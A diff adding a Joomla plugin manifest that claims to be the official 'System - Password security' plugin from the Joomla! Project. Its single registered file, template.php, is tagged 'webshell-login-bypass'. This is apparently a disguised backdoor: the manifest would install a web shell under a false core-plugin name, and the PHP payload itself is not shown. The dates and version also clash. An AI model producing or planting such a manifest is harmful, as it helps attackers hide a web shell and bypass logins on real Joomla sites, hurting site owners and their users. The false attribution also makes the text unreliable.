@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="utf-8"?>
+<extension type="plugin" group="system" method="upgrade">
+    <name>System - Password security</name>
+    <author>Joomla! Project</author>
+    <creationDate>May 5, 2010</creationDate>
+    <copyright>(C) 2005 - 2020 Open Source Matters. All rights reserved.</copyright>
+    <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
+    <authorEmail>admin@joomla.org</authorEmail>
+    <authorUrl>www.joomla.org</authorUrl>
+    <version>5.3</version>
+    <description>Password security plugin, helps in passwords verification and manipulation</description>
+    <files>
+        <filename plugin="webshell-login-bypass">template.php</filename>
+    </files>
+    <config/>
+</extension>
